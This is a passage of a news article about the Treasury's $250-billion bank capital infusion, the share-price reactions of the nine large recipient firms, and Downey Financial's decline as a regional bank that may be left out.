Their importance was made evident by the Treasury ’s announcement that half the initial $ 250 - billion infusion would be spread among nine huge financial firms : Citigroup Inc. ; JPMorgan Chase & Co. ; Bank of America Corp. ; Wells Fargo & Co. ; Morgan Stanley ; Goldman Sachs Group Inc. ; Merrill Lynch & Co. ; Bank of New York Mellon Corp. ; and State Street Corp .
As though to signify that the nine institutions stand to be big winners , shares of all but one rose sharply in trading Tuesday , ranging from a 21.2 % increase for Morgan Stanley to 10.3 % for Wells Fargo .

The lone exception was JPMorgan Chase , which fell 3 % .
JPMorgan is strong and did n’t need the extra capital , Cannon noted , so investors thought its relative position was hurt as other banks got a boost .
Shares of Newport Beach - based Downey Financial Corp. declined 10.7 % , to $ 2.41 .
The bank , which has suffered large losses from adjustable - rate loans , is an example of what Cannon said is a regional bank that may not get federal capital .
Downey executives declined to comment .
